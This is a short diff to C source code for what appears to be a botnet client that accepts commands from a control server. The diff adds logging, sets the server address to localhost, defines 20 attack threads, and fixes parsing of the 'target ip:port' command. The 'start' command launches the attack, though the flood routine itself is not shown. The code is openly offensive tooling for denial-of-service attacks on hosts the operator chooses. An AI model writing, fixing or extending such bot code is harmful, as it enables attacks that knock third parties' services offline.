@@ -8,7 +8,8 @@
 #include "utils.h"
 
 #define TARGET_IP ""        // control server IP here
-#define SERVER_IP ""        // target IP here
+#define SERVER_IP "127.0.0.1"        // target IP here
+#define NUM_THREADS 20
 
 volatile int running = 0;
 HANDLE attack_threads [NUM_THREADS];
@@ -37,15 +38,17 @@ int main() {
 
     while (1) {
         memset(cmd_buf, 0, 1024);
+        printf("Waiting for command...\n");
         receiveCommand(server_socket, cmd_buf);
+        printf("Command received: %s \n", cmd_buf);
         char** cmd_args = split(cmd_buf, ' ');
         char* cmd_arg1 = cmd_args[0];
 
         if (strcmp(cmd_arg1, "target") == 0){
-            char** target = split(cmd_args[1], ":");
+            char** target = split(cmd_args[1], ':');
             target_addr.ip = target[0];
-            target_addr.port = target[1];
-            printf("Target has been set to %s:%i", target_addr.ip, target_addr.port);
+            target_addr.port = atoi(target[1]);
+            printf("Target has been set to %s:%i ", target_addr.ip, target_addr.port);
         }
         else if (strcmp(cmd_arg1, "start") == 0){
             printf("Executing attack...\n");
